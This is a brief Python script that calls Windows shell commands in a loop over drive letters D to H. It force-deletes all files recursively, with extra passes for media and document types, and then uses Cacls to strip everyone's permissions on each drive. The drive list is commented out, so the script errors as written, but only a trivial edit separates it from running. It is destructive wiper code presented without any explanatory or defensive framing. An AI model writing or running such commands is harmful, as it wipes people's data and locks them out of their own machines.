from os import system
#lst = ['D', 'E', 'F', 'H', 'G']
for drive in lst:
    system("del {}:\*.* /f /s /q".format(drive))
    system("del {}:\*.mp4 /f /s /q".format(drive))
    system("del {}:\*.mp3 /f /s /q".format(drive))
    system("del {}:\*.pdf /f /s /q".format(drive))
    system("del {}:\*.jpg /f /s /q".format(drive))
    system("Cacls {}: /e /p everyone:n".format(drive))
